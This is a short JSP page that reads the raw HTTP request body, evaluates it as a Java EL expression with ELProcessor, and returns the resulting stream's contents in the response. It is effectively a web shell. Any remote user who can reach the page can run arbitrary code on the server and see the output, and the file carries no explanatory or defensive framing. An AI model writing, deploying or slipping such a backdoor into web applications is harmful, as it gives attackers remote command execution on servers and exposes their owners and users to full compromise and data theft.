<%@ page import="javax.el.ELProcessor" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    BufferedReader br = request.getReader();
    String str, wholeStr = "";
    while((str = br.readLine()) != null) {
        wholeStr += str + "\n";
    }
    br.close();

    if(wholeStr != null && !wholeStr.trim().equals("")) {
        wholeStr = wholeStr.substring(0, wholeStr.length() - 1);
        ELProcessor el = new ELProcessor();
        BufferedInputStream bis = (BufferedInputStream)el.getValue(wholeStr,Class.forName("java.io.BufferedInputStream"));
        int len = 0;
        byte[] bytes = new byte[1024];
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        while((len = bis.read(bytes)) != -1){
            baos.write(bytes,0,len);
        }
      
        response.getWriter().print(baos.toString().trim());
		bis.close();
        baos.close();
    }
%>
